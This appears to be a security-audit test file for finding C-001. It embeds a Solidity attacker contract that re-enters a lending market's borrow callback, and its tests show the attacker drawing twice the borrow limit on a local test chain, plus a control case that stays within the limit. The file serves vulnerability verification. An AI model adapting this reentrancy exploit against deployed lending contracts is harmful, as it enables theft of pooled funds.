import assert from "node:assert/strict";
import { before, test } from "node:test";
import { compileAll, deploy, ether, makeChain, send } from "../../../test/support.mjs";

const attackerSource = `
// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

interface IMarketC001 {
    function borrow(uint256 amount, address receiver, bytes calldata data) external;
}

contract BorrowCallbackC001 {
    IMarketC001 public immutable market;
    bool private nested;

    constructor(IMarketC001 market_) { market = market_; }

    function attack(uint256 amount) external {
        market.borrow(amount, address(this), hex"01");
    }

    function borrowOnce(uint256 amount) external {
        market.borrow(amount, address(this), "");
    }

    function onBorrow(address, uint256 amount, bytes calldata) external {
        require(msg.sender == address(market), "MARKET");
        if (!nested) {
            nested = true;
            market.borrow(amount, address(this), "");
        }
    }
}
`;

let artifacts;

before(async () => {
  artifacts = await compileAll({
    additionalSources: { "run/evidence/C-001/BorrowCallbackC001.sol": attackerSource }
  });
});

async function setup() {
  const chain = await makeChain();
  const [admin, attacker] = chain.signers;
  const asset = await deploy(artifacts, "MockERC20", admin, ["Aster Asset", "AST", 18]);
  const stable = await deploy(artifacts, "MockERC20", admin, ["Aster Dollar", "aUSD", 18]);
  const vault = await deploy(artifacts, "AsterVault", admin, [await asset.getAddress()]);
  const pool = await deploy(artifacts, "ReservePool", admin, [await asset.getAddress(), await stable.getAddress()]);
  const feed = await deploy(artifacts, "MockFeed", admin, [8, 100_000_000]);
  const oracle = await deploy(artifacts, "ReserveOracle", admin, [await feed.getAddress(), await pool.getAddress()]);
  const market = await deploy(artifacts, "LendingMarket", admin, [
    await stable.getAddress(), await vault.getAddress(), await oracle.getAddress(), await admin.getAddress()
  ]);
  const callback = await deploy(artifacts, "BorrowCallbackC001", attacker, [await market.getAddress()]);
  const callbackAddress = await callback.getAddress();

  await send(stable.mint(await market.getAddress(), ether(10_000)));
  await send(asset.mint(await attacker.getAddress(), ether(1_000)));
  await send(asset.connect(attacker).approve(await vault.getAddress(), ether(1_000)));
  await send(vault.connect(attacker).deposit(ether(1_000), await attacker.getAddress()));
  await send(vault.connect(attacker).approve(await market.getAddress(), ether(1_000)));
  await send(market.connect(attacker).depositCollateral(ether(1_000), callbackAddress));

  assert.equal(await market.borrowLimit(callbackAddress), ether(750));
  return { attacker, callback, callbackAddress, market, stable };
}

test("positive: nested borrow observes stale debt and extracts twice the limit", async () => {
  const { callback, callbackAddress, market, stable } = await setup();
  const limitBefore = await market.borrowLimit(callbackAddress);
  await send(callback.attack(limitBefore));
  const debtAfter = await market.debt(callbackAddress);
  const stableAfter = await stable.balanceOf(callbackAddress);

  assert.equal(limitBefore, ether(750));
  assert.equal(debtAfter, ether(1_500));
  assert.equal(stableAfter, ether(1_500));
  assert(debtAfter > limitBefore);
  console.log(JSON.stringify({ oracle: "C-001-positive", limitBefore: String(limitBefore), debtAfter: String(debtAfter), attackerStable: String(stableAfter) }));
});

test("negative: removing callback data finalizes one debt increment within the limit", async () => {
  const { callback, callbackAddress, market, stable } = await setup();
  const limitBefore = await market.borrowLimit(callbackAddress);
  await send(callback.borrowOnce(limitBefore));
  const debtAfter = await market.debt(callbackAddress);
  const stableAfter = await stable.balanceOf(callbackAddress);

  assert.equal(debtAfter, limitBefore);
  assert.equal(stableAfter, limitBefore);
  console.log(JSON.stringify({ oracle: "C-001-negative", limitBefore: String(limitBefore), debtAfter: String(debtAfter), attackerStable: String(stableAfter) }));
});

